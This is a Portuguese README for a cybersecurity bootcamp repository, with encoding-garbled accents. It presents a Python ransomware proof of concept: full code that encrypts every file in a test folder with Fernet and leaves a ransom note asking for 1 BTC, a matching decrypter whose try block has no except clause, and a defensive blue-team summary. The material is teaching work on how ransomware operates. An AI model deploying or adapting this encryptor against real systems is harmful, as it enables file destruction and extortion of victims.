ü¶† Projeto: Ransomware & Decrypter em Python (PoC)Este reposit√≥rio cont√©m uma Prova de Conceito (PoC) de um Ransomware desenvolvido em Python. O objetivo √© demonstrar na pr√°tica como malwares utilizam criptografia sim√©trica para sequestrar dados e como funciona o processo de recupera√ß√£o (descriptografia).‚ö†Ô∏è Aviso Legal: Este c√≥digo foi desenvolvido estritamente para fins educacionais no Bootcamp Santander Ciberseguran√ßa 2025. Jamais execute em ambientes de produ√ß√£o ou em m√°quinas sem autoriza√ß√£o.‚öôÔ∏è Arquitetura do ProjetoO projeto √© composto por dois scripts principais que simulam o ciclo de vida de um ataque de ransomware:ransomware.py (O Malware): Respons√°vel por gerar a chave de criptografia, varrer o diret√≥rio alvo e criptografar os arquivos.decrypter.py (A Recupera√ß√£o): Respons√°vel por ler a chave gerada e reverter a criptografia, restaurando os arquivos originais.Bibliotecas Utilizadasos: Para navega√ß√£o no sistema de arquivos.cryptography.fernet: Implementa√ß√£o de criptografia sim√©trica (AES) que garante que a mesma chave usada para trancar serve para destrancar.üòà Parte 1: O Encryptor (ransomware.py)Este script simula a infec√ß√£o. Ele cria uma chave √∫nica (chave.key), criptografa todos os arquivos na pasta alvo e deixa uma nota de resgate.from cryptography.fernet import Fernet
import os

# 1. Gerar e Salvar a Chave
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a Chave
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar Arquivo Individual
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    dados_encriptados = f.encrypt(dados)
    
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4. Varredura de Arquivos (Discovery)
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            # Prote√ß√£o para n√£o criptografar o pr√≥prio malware ou a chave
            if nome != "ransomware.py" and nome != "decrypter.py" and not nome.endswith(".key"):
                caminho = os.path.join(raiz, nome)
                lista.append(caminho)
    return lista

# 5. Nota de Resgate
def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 BTC para desbloquear.")

# Execu√ß√£o
if __name__ == "__main__":
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        print(f"[!] Arquivo criptografado: {arquivo}")
        
    criar_mensagem_resgate()
    print("--- Ransomware executado com sucesso! ---")
üòá Parte 2: O Decrypter (decrypter.py)Este script simula a a√ß√£o p√≥s-pagamento do resgate. Ele utiliza a chave.key (que em um cen√°rio real estaria em posse do atacante) para recuperar os dados.from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def decriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados_encriptados = file.read()
        
    dados_descriptografados = f.decrypt(dados_encriptados)
    
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome != "ransomware.py" and nome != "decrypter.py" and not nome.endswith(".key"):
                caminho = os.path.join(raiz, nome)
                lista.append(caminho)
    return lista

if __name__ == "__main__":
    try:
        chave = carregar_chave()
        arquivos = encontrar_arquivos("test_files")
        
        for arquivo in arquivos:
            decriptografar_arquivo(arquivo, chave)
            print(f"[+] Arquivo restaurado: {arquivo}")
            
        print("--- Todos os arquivos foram recuperados com sucesso ---")
    
üõ°Ô∏è An√°lise Defensiva (Blue Team)Como proteger uma infraestrutura contra este tipo de amea√ßa?Estrat√©giaDescri√ß√£o T√©cnicaBackups Offline (Imut√°veis)A defesa mais robusta. Se os dados forem criptografados, restaura-se o backup que n√£o estava conectado √† rede (Air Gapped).EDR (Endpoint Detection and Response)Ferramentas de EDR monitoram comportamentos suspeitos, como a altera√ß√£o massiva de arquivos em curto per√≠odo de tempo (o loop for do nosso script).Least Privilege (Menor Privil√©gio)Usu√°rios comuns n√£o devem ter permiss√£o de escrita em diret√≥rios cr√≠ticos do sistema ou de rede.Monitoramento de Extens√µesConfigurar alertas para a cria√ß√£o de arquivos com extens√µes suspeitas (como .encrypted, .lock, ou notas de resgate LEIA_ISSO.txt).üöÄ Como Executar o Laborat√≥rioCrie uma pasta chamada test_files e coloque alguns arquivos de texto ou imagens dentro dela.Execute o malware:python3 ransomware.py
Verifique que os arquivos em test_files agora est√£o ileg√≠veis.Execute a recupera√ß√£o:python3 decrypter.py
Verifique que os arquivos voltaram ao normal.Desenvolvido durante o Bootcamp Santander Ciberseguran√ßa 2025.
